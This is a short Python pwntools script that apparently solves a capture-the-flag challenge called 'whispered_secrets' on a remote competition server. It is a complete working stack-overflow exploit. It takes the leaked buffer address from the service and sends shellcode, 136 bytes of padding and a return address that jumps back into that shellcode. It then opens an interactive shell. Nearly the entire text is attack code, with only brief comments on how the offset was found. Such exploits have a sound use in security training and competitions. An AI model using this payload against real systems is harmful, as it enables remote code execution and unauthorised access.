#!/usr/bin/env python3

# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
# string to find the RIP offset
# value inside RIP found with gdb: 0x6261616b6261616a
# RIP offset = 136
from pwn import *

#context.binary = elf = ELF('./whispered_secrets', checksec=False)
context.arch = 'amd64'
context.os = 'linux'

OFFSET_TO_RIP = 136

#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13531)
# the received line indicate the starting address of the buffer 
leak_line = p.recvline_contains(b"secret:")
buf_addr = int(leak_line.split(b"secret: ")[1].strip(), 16)
#buf_addr = 0x7ffc989f42b0
print(f"buf = {buf_addr:#x}")

shellcode = asm(shellcraft.sh())

payload = flat(
    shellcode,
    b"A" * (OFFSET_TO_RIP - len(shellcode)),
    p64(buf_addr),
)
p.sendafter(b"secret:\n", payload)
#p.sendline(payload)
p.interactive()